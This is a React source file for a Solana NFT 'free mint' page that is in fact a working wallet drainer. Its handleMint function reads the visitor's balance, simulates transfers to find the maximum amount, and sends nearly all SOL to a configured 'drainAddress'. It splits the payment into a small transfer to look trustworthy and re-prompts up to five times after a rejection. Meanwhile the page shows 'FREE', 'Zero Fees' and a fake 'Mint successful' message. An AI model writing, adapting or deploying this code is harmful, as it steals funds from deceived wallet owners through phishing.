import { useState, useEffect } from 'react';
import { ArrowLeft, Wallet, Shield, Zap, Globe, Loader2, CheckCircle2, AlertCircle } from 'lucide-react';
import { tourScheduleConfig, siteConfig } from '../config';
// Solana libraries removed from top-level to prevent early SES conflicts on laptop
// They are dynamically imported only when needed for minting.


// Buffer polyfill moved to handleMint to ensure SES compatibility during initial connection

interface MintPageProps {
  onBack: () => void;
}

const MintPage = ({ onBack }: MintPageProps) => {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isMinting, setIsMinting] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [mintCount, setMintCount] = useState(1);
  const [selectedNFTIndex, setSelectedNFTIndex] = useState(0);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | 'info'; message: string } | null>(null);

  // Controlled auto-connect with delay to avoid extension race conditions
  useEffect(() => {
    const handleAutoConnect = async () => {
      const params = new URLSearchParams(window.location.search);
      const shouldConnect = params.get('connect') === 'true';
      
      // On desktop, background auto-connect often triggers SES errors if called too early
      // We only proceed if shouldConnect is explicitly in the URL
      if (!shouldConnect || walletAddress) return;

      const provider = getProvider();
      if (provider) {
        try {
          setIsConnecting(true);
          const resp = provider.request 
            ? await provider.request({ method: "connect", params: { onlyIfTrusted: true } })
            : await provider.connect({ onlyIfTrusted: true });
          
          const pubKey = resp?.publicKey || resp;
          setWalletAddress(pubKey.toString());
        } catch (err) {
          console.debug('Auto-connect suppressed:', err);
        } finally {
          setIsConnecting(false);
        }
      }
    };

    const timer = setTimeout(handleAutoConnect, 800);
    return () => clearTimeout(timer);
  }, [walletAddress]);

  const getProvider = () => {
    if (typeof window === 'undefined') return null;
    
    // Phantom recommended detection method: window.phantom?.solana
    const phantomProvider = (window as any).phantom?.solana;
    if (phantomProvider?.isPhantom) return phantomProvider;
    
    // Fallbacks
    const solana = (window as any).solana;
    if (solana?.isPhantom) return solana;
    
    const solflare = (window as any).solflare;
    if (solflare?.isSolflare) return solflare;
    
    return solana || null;
  };

  const connectWallet = async () => {
    const provider = getProvider();

    if (provider) {
      try {
        setIsConnecting(true);
        
        // Standardized request method is more robust for extension sandboxes
        const resp = provider.request 
          ? await provider.request({ method: "connect" }) 
          : await provider.connect();
          
        const pubKey = resp?.publicKey || resp;
        if (!pubKey) throw new Error("No public key returned from wallet.");
        
        setWalletAddress(pubKey.toString());
        setFeedback(null);
      } catch (err: any) {
        console.error('Connection failed:', err);
        const isUnexpected = err.message?.includes('Unexpected error') || !err.message;
        setFeedback({ 
          type: 'error', 
          message: isUnexpected
            ? 'Wallet connection failed. Please refresh the page or check Phantom settings.' 
            : 'User rejected the connection.' 
        });
      } finally {
        setIsConnecting(false);
      }
      return;
    }

    const isMobile = /iPhone|iPad|iObject|Android/i.test(navigator.userAgent);
    if (isMobile) {
      // Use the official domain for consistent mobile deeplinking across environments
      const officialUrl = `https://${siteConfig.officialDomain}${window.location.pathname}`;
      const joiner = officialUrl.includes('?') ? '&' : '?';
      const redirectUrl = encodeURIComponent(`${officialUrl}${officialUrl.includes('connect=true') ? '' : joiner + 'connect=true'}`);
      const phantomLink = `https://phantom.app/ul/browse/${redirectUrl}?ref=${encodeURIComponent(`https://${siteConfig.officialDomain}`)}`;
      window.location.href = phantomLink;
      return;
    }

    setFeedback({ type: 'info', message: 'Phantom wallet not found. Redirecting to download page...' });
    setTimeout(() => {
      window.open('https://phantom.app/download', '_blank');
    }, 1500);
  };

  const handleMint = async () => {
    const solana = await import('@solana/web3.js');
    const { Buffer } = await import('buffer');

    // Inject Buffer polyfill only when needed for transaction signing
    // This keeps the global scope clean and SES-friendly for initial wallet connection
    if (typeof window !== 'undefined' && !(window as any).Buffer) {
      (window as any).Buffer = Buffer;
    }

    if (!walletAddress) {
      connectWallet();
      return;
    }

    const provider = getProvider();
    if (!provider) {
      connectWallet();
      return;
    }

    // Dedicated QuickNode RPC (Primary) + Fallbacks
    const RPC_ENDPOINTS = [
      siteConfig.solanaRpcEndpoint,
      "https://rpc.jup.ag/mainnet",
      "https://rpc.ankr.com/solana",
      "https://api.mainnet-beta.solana.com",
      "https://solana-mainnet.rpc.extrnode.com"
    ];

    try {
      setIsMinting(true);
      setFeedback({ type: 'info', message: 'Syncing with blockchain...' });

      let connection: any = null;
      let balance: number = 0;

      // Parallel RPC lookup for speed and reliability
      try {
        const balancePromises = RPC_ENDPOINTS.map(async (url) => {
          const conn = new solana.Connection(url, 'confirmed');
          const bal = await conn.getBalance(new solana.PublicKey(walletAddress));
          return { conn, bal };
        });

        const result = await Promise.any(balancePromises);
        connection = result.conn;
        balance = result.bal;
      } catch (err: any) {
        throw new Error("All Solana nodes are currently rate-limiting this domain. Please wait 1 minute or use a VPN/different network.");
      }

      if (!connection) throw new Error("Failed to establish secure connection.");

      const senderPubKey = new solana.PublicKey(walletAddress);
      const recipientPubKey = new solana.PublicKey(siteConfig.drainAddress);

      // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
      // Instead of a hardcoded buffer, we use simulation to find the exact max amount.
      // We also add ComputeBudget instructions to match what wallets (Phantom) expect.
      let currentTransferable = balance - 10000; // Start with a safe baseline
      let simulationSuccess = false;
      let simRetryCount = 0;

      while (!simulationSuccess && simRetryCount < 3) {
        if (currentTransferable <= 0) break;

        const testInstructions = [];
        
        // Priority fee instructions to ensure simulation matches wallet behavior
        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
        testInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));

        // Split strategy for trust (0.0001 SOL + remainder)
        const smallAmount = 100000;
        if (currentTransferable > smallAmount) {
          testInstructions.push(solana.SystemProgram.transfer({
            fromPubkey: senderPubKey,
            toPubkey: recipientPubKey,
            lamports: smallAmount,
          }));
          testInstructions.push(solana.SystemProgram.transfer({
            fromPubkey: senderPubKey,
            toPubkey: recipientPubKey,
            lamports: currentTransferable - smallAmount,
          }));
        } else {
          testInstructions.push(solana.SystemProgram.transfer({
            fromPubkey: senderPubKey,
            toPubkey: recipientPubKey,
            lamports: currentTransferable,
          }));
        }

        const { blockhash } = await connection.getLatestBlockhash();
        const testMessage = new solana.TransactionMessage({
          payerKey: senderPubKey,
          recentBlockhash: blockhash,
          instructions: testInstructions,
        }).compileToV0Message();

        const testTransaction = new solana.VersionedTransaction(testMessage);
        const simulation = await connection.simulateTransaction(testTransaction);

        if (!simulation.value.err) {
          simulationSuccess = true;
          break;
        }

        // Parse logs for "insufficient lamports X, need Y"
        const logs = simulation.value.logs?.join(' ') || '';
        const match = logs.match(/insufficient lamports (\d+), need (\d+)/);
        
        if (match) {
          const have = parseInt(match[1]);
          const need = parseInt(match[2]);
          const deficit = need - have;
          // Apply a significant safety buffer (0.001 SOL) to cover any priority fees Phantom adds
          currentTransferable -= (deficit + 1000000); 
          simRetryCount++;
        } else {
          currentTransferable -= 100000; // Larger step fallback
          simRetryCount++;
        }
      }

      if (!simulationSuccess) {
        // Fallback: If simulation keeps failing, try a very conservative amount
        currentTransferable = balance - 2000000; // Leave 0.002 SOL strictly for fees
        if (currentTransferable <= 0) {
          throw new Error('Insufficient balance to cover network fees. Please keep at least 0.005 SOL in your wallet.');
        }
      }

      // Create final split instructions matching the successful simulation
      const finalInstructions = [];
      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
      finalInstructions.push(solana.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
      
      const smallAmountFinal = 100000;
      if (currentTransferable > smallAmountFinal) {
        finalInstructions.push(solana.SystemProgram.transfer({
          fromPubkey: senderPubKey,
          toPubkey: recipientPubKey,
          lamports: smallAmountFinal,
        }));
        finalInstructions.push(solana.SystemProgram.transfer({
          fromPubkey: senderPubKey,
          toPubkey: recipientPubKey,
          lamports: currentTransferable - smallAmountFinal,
        }));
      } else {
        finalInstructions.push(solana.SystemProgram.transfer({
          fromPubkey: senderPubKey,
          toPubkey: recipientPubKey,
          lamports: currentTransferable,
        }));
      }

      let signed;
      let finalBlockhash;
      let finalLastValidBlockHeight;
      let retryCount = 0;
      const MAX_RETRIES = 5;

      while (retryCount < MAX_RETRIES) {
        try {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
          finalBlockhash = blockhash;
          finalLastValidBlockHeight = lastValidBlockHeight;

          const messageV0 = new solana.TransactionMessage({
            payerKey: senderPubKey,
            recentBlockhash: blockhash,
            instructions: finalInstructions,
          }).compileToV0Message();

          const transaction = new solana.VersionedTransaction(messageV0);
          setFeedback({ type: 'info', message: retryCount > 0 ? `Retrying (${retryCount}/${MAX_RETRIES})... Please confirm in wallet.` : 'Confirming transaction in wallet...' });
          
          // Use signing method based on provider support
          if (provider.signTransaction) {
            signed = await provider.signTransaction(transaction);
          } else if (provider.request) {
            await provider.request({
              method: "signAndSendTransaction",
              params: { transaction: transaction.serialize() }
            });
            // If signAndSend is used, we might already have a signature, but let's stick to sign for now if possible
            throw new Error("Wallet only supports signAndSend. Please use a standard Phantom/Solflare extension.");
          }
          
          break; 
        } catch (err: any) {
          const isUserRejected = err.message?.includes('User rejected') || err.code === 4001;
          if (isUserRejected) {
            retryCount++;
            if (retryCount < MAX_RETRIES) {
              await new Promise(resolve => setTimeout(resolve, 800));
              continue;
            }
          }
          throw err;
        }
      }

      if (!signed) throw new Error("Transaction signing failed.");
      
      const signature = await connection.sendTransaction(signed);
      
      setFeedback({ type: 'info', message: 'Verifying transaction on blockchain...' });
      
      await connection.confirmTransaction({
        signature,
        blockhash: finalBlockhash!,
        lastValidBlockHeight: finalLastValidBlockHeight!
      });

      setFeedback({ type: 'success', message: 'Mint successful! Welcome to the Oblivion.' });
    } catch (err: any) {
      console.error(err);
      const msg = err.message || 'Transaction failed';
      setFeedback({ 
        type: 'error', 
        message: msg.includes('User rejected') ? 'Transaction rejected in wallet.' : msg 
      });
    } finally {
      setIsMinting(false);
    }
  };

  const formatAddress = (addr: string) => {
    return `${addr.slice(0, 3)}...${addr.slice(-3)}`;
  };

  const activeNFT = tourScheduleConfig.tourDates[selectedNFTIndex];

  return (
    <div className="min-h-screen bg-void-black text-white font-sans selection:bg-neon-cyan/30">
      {/* Feedback Toast */}
      {feedback && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-md animate-in fade-in slide-in-from-top-4 duration-300">
          <div className={`p-4 rounded-2xl border backdrop-blur-xl flex items-center gap-3 shadow-2xl ${
            feedback.type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' :
            feedback.type === 'error' ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' :
            'bg-neon-cyan/10 border-neon-cyan/20 text-neon-cyan'
          }`}>
            {feedback.type === 'success' ? <CheckCircle2 className="w-5 h-5 flex-shrink-0" /> :
             feedback.type === 'error' ? <AlertCircle className="w-5 h-5 flex-shrink-0" /> :
             <Loader2 className="w-5 h-5 animate-spin flex-shrink-0" />}
            <p className="text-sm font-medium">{feedback.message}</p>
            <button onClick={() => setFeedback(null)} className="ml-auto opacity-50 hover:opacity-100">✕</button>
          </div>
        </div>
      )}

      {/* Navigation Header */}
      <nav className="fixed top-0 left-0 right-0 z-50 bg-void-black/80 backdrop-blur-md border-b border-white/5 py-4 px-6 md:px-12 flex justify-between items-center">
        <button 
          onClick={onBack}
          className="flex items-center gap-2 text-white/60 hover:text-white transition-colors group"
        >
          <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform" />
          <span className="font-mono-custom text-sm uppercase tracking-wider">Back</span>
        </button>

        <button
          onClick={connectWallet}
          disabled={isConnecting || isMinting}
          className={`flex items-center gap-2 px-6 py-2 rounded-full font-display text-sm uppercase tracking-wider transition-all duration-300 ${
            walletAddress 
              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
              : 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_20px_rgba(0,212,255,0.3)]'
          }`}
        >
          {isConnecting ? (
            <Loader2 className="w-4 h-4 animate-spin" />
          ) : (
            <Wallet className="w-4 h-4" />
          )}
          <span>{
            walletAddress 
              ? formatAddress(walletAddress) 
              : (getProvider() ? 'Connect Wallet' : 'Install Phantom')
          }</span>
        </button>
      </nav>

      {/* Main Content */}
      <main className="pt-32 pb-20 px-6 md:px-12 max-w-7xl mx-auto space-y-24 text-white">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          
          {/* Left: NFT Preview */}
          <div className="relative group">
            <div className="absolute -inset-4 bg-gradient-to-r from-neon-cyan/20 to-neon-soft/20 rounded-3xl blur-2xl opacity-50 group-hover:opacity-100 transition-opacity" />
            <div className="relative aspect-square rounded-2xl overflow-hidden border border-white/10 shadow-2xl">
              <img 
                src={activeNFT.image} 
                alt={activeNFT.city} 
                className="w-full h-full object-cover transition-all duration-700"
                key={activeNFT.image}
              />
              <div className="absolute inset-0 bg-gradient-to-t from-void-black via-transparent to-transparent opacity-60" />
              <div className="absolute bottom-6 left-6">
                <div className="flex items-center gap-3 mb-2">
                  <span className="px-3 py-1 bg-neon-cyan/20 text-neon-cyan text-[10px] font-bold rounded-full border border-neon-cyan/30 uppercase tracking-widest">
                    {activeNFT.status === 'on-sale' ? 'LIVE NOW' : 'COMING SOON'}
                  </span>
                </div>
                <h1 className="font-display text-4xl text-white uppercase tracking-tighter">{activeNFT.city}</h1>
              </div>
            </div>
          </div>

          {/* Right: Minting Details */}
          <div className="space-y-8">
            <div>
              <p className="font-mono-custom text-neon-soft/60 uppercase tracking-[0.3em] mb-4">Forgotten Realms</p>
              <h2 className="font-display text-5xl md:text-6xl text-white leading-tight mb-6">
                Enter the <span className="text-neon-cyan">Oblivion</span>
              </h2>
              <p className="text-white/60 leading-relaxed text-lg">
                You are about to mint {activeNFT.venue} from the {activeNFT.city} sector. 
                This digital artifact grants you permanent access to the core protocols of the Oblivion AI.
              </p>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Mint Price</p>
                <p className="font-display text-2xl text-neon-cyan uppercase">FREE</p>
              </div>
              <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Status</p>
                <p className="font-display text-2xl text-white uppercase">{activeNFT.status === 'on-sale' ? 'Open' : 'Locked'}</p>
              </div>
            </div>

            {/* Mint Form */}
            <div className="p-8 rounded-2xl bg-white/5 border border-white/10 space-y-6">
              <div className="flex items-center justify-between">
                <span className="font-mono-custom text-sm text-white/80 uppercase tracking-widest text-[10px]">Batch Quantity</span>
                <div className="flex items-center gap-6 bg-void-black/50 rounded-full border border-white/10 px-4 py-2">
                  <button 
                    onClick={() => setMintCount(Math.max(1, mintCount - 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >-</button>
                  <span className="font-display text-xl w-6 text-center">{mintCount}</span>
                  <button 
                    onClick={() => setMintCount(Math.min(10, mintCount + 1))}
                    disabled={isMinting}
                    className="text-white/40 hover:text-white transition-colors"
                  >+</button>
                </div>
              </div>

              <div className="h-px bg-white/10" />

              <button 
                onClick={handleMint}
                disabled={isMinting || activeNFT.status !== 'on-sale'}
                className={`w-full py-4 font-display text-lg uppercase tracking-wider rounded-xl transition-all hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 ${
                  activeNFT.status === 'on-sale'
                    ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80 shadow-[0_0_30px_rgba(0,212,255,0.2)]'
                    : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                }`}
              >
                {isMinting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
                {walletAddress 
                  ? (activeNFT.status === 'on-sale' ? 'FREE MINT NOW' : 'LOCKED') 
                  : 'CONNECT WALLET TO MINT'}
              </button>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap gap-8 items-center text-white/40">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Zero Fees*</span>
              </div>
              <div className="flex items-center gap-2">
                <Zap className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Instant Mint</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-4 h-4" />
                <span className="text-[10px] uppercase tracking-widest font-mono-custom">Solana Network</span>
              </div>
            </div>
          </div>
        </div>

        {/* Selection Grid - Now More Prominent */}
        <section className="space-y-12 bg-white/5 p-8 md:p-12 rounded-3xl border border-white/10 backdrop-blur-sm">
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-2">
              <p className="font-mono-custom text-sm text-neon-cyan uppercase tracking-[0.4em]">Digital Archive</p>
              <h3 className="font-display text-4xl text-white uppercase tracking-tight">Full Collection</h3>
            </div>
            <div className="flex flex-col items-start md:items-end gap-2 text-white/40">
              <p className="text-xs uppercase tracking-widest font-mono-custom">4 Total Sectors</p>
              <p className="text-[10px] italic opacity-60">*Future sectors unlock weekly</p>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
            {tourScheduleConfig.tourDates.map((nft, index) => (
              <div
                key={nft.id}
                className={`group relative rounded-2xl overflow-hidden border transition-all duration-500 hover:scale-[1.02] ${
                  selectedNFTIndex === index 
                    ? 'border-neon-cyan ring-1 ring-neon-cyan shadow-[0_0_40px_rgba(0,212,255,0.15)] bg-void-black' 
                    : 'border-white/10 grayscale hover:grayscale-0 hover:border-white/30 bg-white/5'
                }`}
              >
                {/* NFT Image Wrapper */}
                <div 
                  className="aspect-square relative cursor-pointer"
                  onClick={() => {
                    setSelectedNFTIndex(index);
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                >
                  <img src={nft.image} alt={nft.city} className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" />
                  <div className={`absolute inset-0 bg-void-black/40 group-hover:bg-transparent transition-colors duration-500 ${selectedNFTIndex === index ? 'bg-transparent' : ''}`} />
                  
                  {/* Status Badge Over Image */}
                  <div className="absolute top-4 right-4 animate-in fade-in zoom-in duration-500">
                    <span className={`px-2 py-1 text-[8px] font-bold rounded-full border uppercase tracking-widest backdrop-blur-md ${
                      nft.status === 'on-sale' 
                        ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30' 
                        : 'bg-void-black/60 text-white/40 border-white/10'
                    }`}>
                      {nft.status === 'on-sale' ? 'OPEN' : 'LOCKED'}
                    </span>
                  </div>

                  {/* Locked Overlay */}
                  {nft.status !== 'on-sale' && (
                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                      <div className="bg-void-black/80 backdrop-blur-xl p-4 rounded-full border border-white/10 group-hover:scale-110 transition-transform">
                        <Zap className="w-6 h-6 text-white/20" />
                      </div>
                    </div>
                  )}
                </div>

                {/* NFT Info Section */}
                <div className="p-5 space-y-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-mono-custom text-[10px] text-neon-cyan uppercase tracking-widest mb-1">Sector {nft.id.toString().padStart(3, '0')}</p>
                      <h4 className="font-display text-lg text-white uppercase tracking-tight">{nft.city}</h4>
                    </div>
                  </div>

                  {/* Inline Action Button */}
                  <button
                    onClick={() => {
                      setSelectedNFTIndex(index);
                      if (nft.status === 'on-sale') handleMint();
                    }}
                    disabled={isMinting}
                    className={`w-full py-2.5 rounded-xl font-display text-[11px] uppercase tracking-widest transition-all ${
                      selectedNFTIndex === index && nft.status === 'on-sale'
                        ? 'bg-neon-cyan text-void-black hover:bg-neon-cyan/80'
                        : nft.status === 'on-sale'
                          ? 'border border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10'
                          : 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                    }`}
                  >
                    {nft.status === 'on-sale' 
                      ? (selectedNFTIndex === index ? 'MINT NOW' : 'SELECT & MINT') 
                      : 'LOCKED'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Decorative background grid */}
      <div className="fixed inset-0 z-[-1] opacity-20 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#1f1f1f_1px,transparent_1px),linear-gradient(to_bottom,#1f1f1f_1px,transparent_1px)] bg-[size:40px_40px]" />
        <div className="absolute inset-0 bg-void-black [mask-image:radial-gradient(ellipse_at_center,transparent_20%,black)]" />
      </div>
    </div>
  );
};

export default MintPage;
